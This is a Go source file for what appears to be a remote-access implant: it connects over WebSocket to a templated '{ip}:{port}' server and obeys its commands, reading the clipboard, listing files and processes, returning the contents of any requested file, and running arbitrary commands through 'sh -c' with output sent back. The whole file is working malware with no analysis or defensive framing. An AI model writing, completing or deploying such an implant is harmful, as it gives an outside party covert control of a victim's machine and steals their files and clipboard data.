package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
	"strings"

	"github.com/atotto/clipboard"
	"github.com/gorilla/websocket"
	"net/url"
)

// CommandResponse represents the structure for sending responses back to the server
type CommandResponse struct {
	Command string `json:"command"`
	Result  string `json:"result"`
}

// CommandRequest represents the structure for receiving commands from the server
type CommandRequest struct {
	Command string `json:"command"`
}

// connectWebSocket establishes a websocket connection
func connectWebSocket(serverIP string, serverPort string) (*websocket.Conn, error) {
	u := url.URL{Scheme: "ws", Host: fmt.Sprintf("%s:%s", serverIP, serverPort), Path: "/ws"}
	log.Printf("Connecting to server at %s", u.String())
	conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %w", err)
	}
	return conn, nil
}

// handleCommand interprets and executes commands, returning the result as a string
func handleCommand(command string) (string, error) {
	command = strings.TrimSpace(command) // Remove any extra spaces
	switch command {
	case "list_files":
		return listFiles()
	case "get_clipboard":
		return getClipboardContent()
	case "list_processes":
		return listProcesses()
	default:
		// If command is download/upload/execute, further action may be required
		if strings.HasPrefix(command, "download_file ") {
			filePath := strings.TrimSpace(strings.TrimPrefix(command, "download_file "))
			return downloadFile(filePath)
		} else if strings.HasPrefix(command, "upload_file ") {
			filePath := strings.TrimSpace(strings.TrimPrefix(command, "upload_file "))
			return uploadFile(filePath)
		} else if strings.HasPrefix(command, "execute_command ") {
			cmd := strings.TrimSpace(strings.TrimPrefix(command, "execute_command "))
			return executeCommand(cmd)
		}
		return "", fmt.Errorf("unknown command: %s", command)
	}
}

func listFiles() (string, error) {
	files, err := ioutil.ReadDir(".")
	if err != nil {
		return "", err
	}

	var fileList []string
	for _, file := range files {
		fileList = append(fileList, file.Name())
	}
	return strings.Join(fileList, "\n"), nil
}

func getClipboardContent() (string, error) {
	content, err := clipboard.ReadAll()
	if err != nil {
		return "", err
	}
	return content, nil
}

func downloadFile(filePath string) (string, error) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func uploadFile(filePath string) (string, error) {
	fileData, err := ioutil.ReadFile(filePath)
	if err != nil {
		return "", err
	}
	return string(fileData), nil
}

func executeCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func listProcesses() (string, error) {
	cmd := exec.Command("ps", "aux")
	output, err := cmd.CombinedOutput()
	return string(output), err
}

// receiveAndRespond listens for messages from the server, processes commands, and sends responses back
func receiveAndRespond(conn *websocket.Conn) {
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Error reading message: %v", err)
			return
		}

		// Parse the JSON message to extract the command
		var commandRequest CommandRequest
		if err := json.Unmarshal(message, &commandRequest); err != nil {
			log.Printf("Error parsing command JSON: %v", err)
			continue
		}

		command := strings.TrimSpace(commandRequest.Command)
		log.Printf("Received command from server: %s", command)

		// Handle command and get result
		result, err := handleCommand(command)
		if err != nil {
			result = fmt.Sprintf("Error: %v", err)
		}

		// Send response back to server
		response := CommandResponse{
			Command: command,
			Result:  result,
		}
		responseData, _ := json.Marshal(response)
		if err := conn.WriteMessage(websocket.TextMessage, responseData); err != nil {
			log.Printf("Error sending response: %v", err)
		}
	}
}

func main() {
	// Get server IP and port from program arguments
	serverIP := "{ip}"
	serverPort := "{port}"

	// Connect to server
	conn, err := connectWebSocket(serverIP, serverPort)
	if err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	defer conn.Close()

	// Start receiving and responding to server commands
	receiveAndRespond(conn)
}
